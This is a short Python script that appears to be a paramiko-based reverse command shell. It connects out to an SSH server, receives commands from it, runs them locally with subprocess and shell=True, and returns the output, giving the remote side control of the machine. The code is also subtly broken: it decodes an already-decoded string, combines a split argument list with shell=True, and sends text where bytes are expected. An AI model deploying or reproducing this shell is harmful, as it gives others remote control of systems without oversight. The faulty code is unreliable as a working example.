import paramiko
import shlex
import subprocess

def ssh_command(ip, port, username, password, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=username, password=password)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024).decode()
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e).encode())
        client.close()
    return

if __name__ == '__main__':
    import getpass
    username = input("Enter username: ")
    password = getpass.getpass("Enter password: ")

    ip = input("Enter IP address: ")
    port = int(input("Enter port (default 22): ") or 22)

    ssh_command(ip, port, username, password, 'Client Connected')
